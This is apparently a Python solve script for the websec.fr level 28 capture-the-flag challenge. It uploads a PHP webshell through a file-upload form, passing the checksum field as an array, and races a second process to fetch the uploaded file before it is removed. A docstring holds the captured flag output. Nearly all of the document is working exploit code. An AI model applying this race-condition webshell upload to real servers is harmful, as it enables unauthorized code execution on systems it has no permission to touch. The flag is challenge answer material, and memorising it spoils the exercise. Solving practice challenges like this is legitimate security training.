#!/usr/bin/python
# coding: utf-8

from requests import *
from multiprocessing import Process
import time

md5ip = '70d75feefefdefaa925f4dac3179fec3'
webshell = 'payload.php'

def uploadWebshell():
    url = 'https://websec.fr/level28/index.php'
    # url = 'http://3dc.oa.to:4000/15no47m1'

    files = {'flag_file': (webshell, open(webshell, 'rb'), 'application/octet-stream')}
    data = {'checksum[]': '123', 'submit': 'Upload and check'}

    r = post(url, files = files, data = data)
    print '[*] your webshell successfully uploaded!'
    # print r.text


def executeWebshell():
    for _ in range(1):
        time.sleep(0.1)
        url = 'https://websec.fr/level28/{0}.php'.format(md5ip)
        r = get(url)
        print r.text

def main():
    p1 = Process(target = uploadWebshell)
    p2 = Process(target = executeWebshell)

    p1.start()
    p2.start()

if __name__ == '__main__':
    main()


"""
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br />$flag&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}'</span><span style="color: #007700">;<br /></span>
</span>
</code>

[*] flag : WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}
"""
